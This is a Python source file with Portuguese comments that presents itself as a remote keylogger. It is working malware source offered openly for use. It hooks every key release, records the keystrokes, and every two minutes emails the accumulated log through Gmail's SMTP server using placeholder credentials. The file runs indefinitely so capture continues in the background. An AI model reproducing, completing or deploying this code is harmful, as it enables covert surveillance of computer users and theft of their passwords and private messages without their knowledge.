# keylogger_remoto_py
#Um Keylogger Remoto em Python

import keyboard # para keylogs
import smtplib # para enviar email usando o protocolo SMTP (gmail)
# O semáforo é para bloquear o segmento atual
# O temporizador é para executar um método após uma quantidade de tempo "intervalo"
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 120 # 02 minutes
EMAIL_ADDRESS = "<seu_endereço_de_email>"
EMAIL_PASSWORD = "<senha_de_app>"

class Keylogger:
    def __init__(self, interval):
        # passaremos SEND_REPORT_EVERY para o intervalo
        self.interval = interval
        # esta é a variável de string que contém o log de todos
        # as teclas dentro de "self.interval"
        self.log = ""
        # para bloquear após definir o ouvinte on_release
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        Esse retorno de chamada é chamado sempre que um evento de teclado ocorre
         (ou seja, quando uma chave é liberada neste exemplo)
        """
        name = event.name
        if len(name) > 1:
            # não é um caractere, tecla especial (por exemplo, ctrl, alt etc.)
            # maiúsculas com []
            if name == "space":
                # " "em vez de "espaço"
                name = " "
            elif name == "enter":
                # adicione uma nova linha sempre que um ENTER for pressionado
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # substituir espaços por sublinhados
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        # gerencia uma conexão com um servidor SMTP
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # conectar-se ao servidor SMTP como modo TLS (por segurança)
        server.starttls()
        # faça login na conta de email
        server.login(email, password)
        # envie a mensagem real
        server.sendmail(email, email, message)
        # finaliza a sessão
        server.quit()

    def report(self):
        """
        Esta função é chamada todo "self.interval"
         Ele basicamente envia keylogs e redefine a variável "self.log"
        """
        if self.log:
            # se houver algo no log, relate-o
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # pode imprimir em um arquivo, o que você quiser
            # imprimir(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # inicie o keylogger
        keyboard.on_release(callback=self.callback)
        # comece a relatar os keylogs
        self.report()
        # bloquear o segmento atual
        # desde on_release () não bloqueia o segmento atual
        # se não o bloquearmos, quando executarmos o programa, nada acontecerá
        # isso ocorre porque on_release () iniciará o ouvinte em um thread separado
        self.semaphore.acquire()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
#by Herik_Carvalho
